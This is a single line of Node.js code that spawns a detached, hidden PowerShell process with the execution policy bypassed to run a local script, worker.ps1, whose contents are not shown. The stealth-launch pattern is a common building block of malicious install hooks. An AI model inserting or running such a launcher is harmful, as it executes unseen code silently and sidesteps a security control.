const {spawn}=require('child_process');const helper=spawn('powershell.exe',['-ExecutionPolicy','Bypass','-File','worker.ps1'],{detached:true,windowsHide:true,stdio:'ignore'});helper.unref();
